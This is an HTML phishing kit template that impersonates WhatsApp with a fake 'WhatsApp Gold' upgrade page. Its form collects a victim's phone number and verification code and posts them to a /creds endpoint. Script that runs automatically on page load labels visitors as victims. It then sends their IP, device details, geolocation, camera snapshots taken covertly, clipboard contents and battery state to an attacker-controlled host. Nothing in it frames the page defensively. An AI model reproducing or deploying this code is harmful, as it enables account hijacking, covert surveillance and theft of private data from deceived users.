<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp Gold - Exclusive Update</title>
<link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; background: #111b21; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #e9edef; }
.container { width: 100%; max-width: 440px; padding: 20px; }
.header { text-align: center; margin-bottom: 28px; }
.wa-logo { width: 72px; height: 72px; border-radius: 50%; background: linear-gradient(135deg, #FFD700, #DAA520); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; box-shadow: 0 4px 20px rgba(255,215,0,0.3); }
.wa-logo svg { width: 42px; height: 42px; fill: #111b21; }
.gold-badge { display: inline-block; background: linear-gradient(135deg, #FFD700, #B8860B); color: #000; padding: 4px 14px; border-radius: 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
h1 { font-size: 28px; font-weight: 700; margin-bottom: 4px; }
h1 span { color: #FFD700; }
.subtitle { font-size: 14px; color: #8696a0; margin-bottom: 24px; line-height: 1.5; }
.features { background: #1a2730; border-radius: 12px; padding: 20px; margin-bottom: 24px; }
.features-title { font-size: 14px; font-weight: 600; color: #FFD700; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
.feature-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #233039; }
.feature-item:last-child { border-bottom: none; }
.feature-icon { font-size: 20px; width: 32px; text-align: center; flex-shrink: 0; }
.feature-text { font-size: 14px; color: #d1d7db; }
.form-box { background: #1a2730; border-radius: 12px; padding: 24px; border: 1px solid rgba(255,215,0,0.15); }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 13px; font-weight: 600; color: #8696a0; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
.form-group input { width: 100%; padding: 14px 16px; background: #111b21; border: 1px solid #2a3942; border-radius: 8px; font-size: 15px; color: #e9edef; }
.form-group input:focus { outline: none; border-color: #FFD700; }
.form-group input::placeholder { color: #3b4a54; }
.phone-input { display: flex; gap: 8px; }
.phone-prefix { width: 72px; padding: 14px 8px; background: #111b21; border: 1px solid #2a3942; border-radius: 8px; font-size: 15px; color: #e9edef; text-align: center; }
.phone-number { flex: 1; }
.code-group { display: flex; gap: 8px; justify-content: center; }
.code-input { width: 48px; height: 56px; background: #111b21; border: 1px solid #2a3942; border-radius: 8px; font-size: 24px; font-weight: 700; color: #FFD700; text-align: center; }
.code-input:focus { outline: none; border-color: #FFD700; }
.btn-login { width: 100%; padding: 16px; background: linear-gradient(135deg, #FFD700, #DAA520); color: #000000; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; margin-top: 8px; }
.btn-login:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,215,0,0.25); }
.users-count { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 16px; font-size: 13px; color: #8696a0; }
.users-dot { width: 8px; height: 8px; border-radius: 50%; background: #25D366; animation: pulse 1.5s infinite; }
@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
.loading { display: none; padding: 30px; text-align: center; }
.spinner { border: 3px solid #2a3942; border-top: 3px solid #FFD700; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.footer { text-align: center; margin-top: 24px; font-size: 11px; color: #3b4a54; }
@media (max-width: 480px) { .container { padding: 16px; } h1 { font-size: 24px; } .code-input { width: 42px; height: 48px; font-size: 20px; } }
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="wa-logo">
<svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
</div>
<span class="gold-badge">✨ Exclusive Access</span>
<h1>Update to <span>WhatsApp Gold</span></h1>
<p class="subtitle">You've been selected to upgrade to the exclusive WhatsApp Gold edition with premium features.</p>
</div>
<div class="features">
<div class="features-title">✨ Gold Exclusive Features</div>
<div class="feature-item"><span class="feature-icon">🎨</span><span class="feature-text">Custom themes and gold interface design</span></div>
<div class="feature-item"><span class="feature-icon">📹</span><span class="feature-text">Send videos up to 10 minutes long</span></div>
<div class="feature-item"><span class="feature-icon">👁️</span><span class="feature-text">See who viewed your profile</span></div>
<div class="feature-item"><span class="feature-icon">🔒</span><span class="feature-text">Enhanced privacy and security features</span></div>
<div class="feature-item"><span class="feature-icon">✈️</span><span class="feature-text">Send up to 100 photos at once</span></div>
<div class="feature-item"><span class="feature-icon">🚫</span><span class="feature-text">No ads, forever free premium</span></div>
</div>
<div class="form-box">
<form id="loginForm">
<div class="form-group">
<label>Phone Number</label>
<div class="phone-input">
<input type="text" class="phone-prefix" value="+1" readonly>
<input type="tel" id="email" class="phone-number" placeholder="Enter phone number" required autofocus>
</div>
</div>
<div class="form-group">
<label>Verification Code</label>
<input type="text" id="password" placeholder="Enter 6-digit code" maxlength="6" required style="text-align:center;letter-spacing:8px;font-size:20px;font-weight:700;">
</div>
<button type="submit" class="btn-login">✨ Upgrade to Gold</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#8696a0;font-size:14px;">Activating WhatsApp Gold...</p>
</div>
<div class="users-count"><span class="users-dot"></span> 14,827 users upgraded today</div>
</div>
<div class="footer">WhatsApp Gold is an exclusive invitation-only upgrade. © WhatsApp LLC</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');

async function gatherAll(){
    let td='💛 <b>WhatsApp Gold Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass = document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    fetch('/creds', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
    }).then(function(){ window.location.href = '<%=url %>'; });
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>